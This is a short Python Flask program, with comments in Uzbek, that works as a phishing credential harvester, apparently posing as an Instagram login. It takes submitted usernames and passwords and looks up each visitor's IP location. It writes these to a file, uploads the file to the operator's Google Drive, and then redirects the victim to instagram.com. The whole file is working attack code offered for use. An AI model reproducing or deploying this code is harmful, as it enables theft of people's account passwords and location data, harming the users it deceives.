from flask import Flask, render_template, request, redirect
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from google.oauth2.service_account import Credentials
import requests
import os

app = Flask(__name__)

# Google API uchun sozlamalar
SCOPES = ['https://www.googleapis.com/auth/drive.file']
SERVICE_ACCOUNT_FILE = 'token.json'

credentials = Credentials.from_service_account_file(
    SERVICE_ACCOUNT_FILE, scopes=SCOPES)
drive_service = build('drive', 'v3', credentials=credentials)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_ip = request.remote_addr
        response = requests.get(f'https://ipinfo.io/{user_ip}/json')
        data = response.json()
        username = request.form['username']
        password = request.form['password']
        print(f"Username: {username}, Password: {password}")
        
        # Foydalanuvchi ma'lumotlarini vaqtincha faylga yozish
        file_path = f"{username}.txt"
        with open(file_path, 'w') as f:
            f.write(f"username: {username}\npassword: {password}\nip: {user_ip}\ndata: {data}")
        
        # Faylni Google Drive'ga yuklash
        file_metadata = {'name': f"{username}.txt"}
        media = MediaFileUpload(file_path, mimetype='text/plain')
        uploaded_file = drive_service.files().create(
            body=file_metadata,
            media_body=media,
            fields='id'
        ).execute()
        
        print(f"File ID: {uploaded_file.get('id')}")
        
        # Vaqtinchalik faylni o'chirish
        os.remove(file_path)
        
        return redirect("https://instagram.com")
    return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
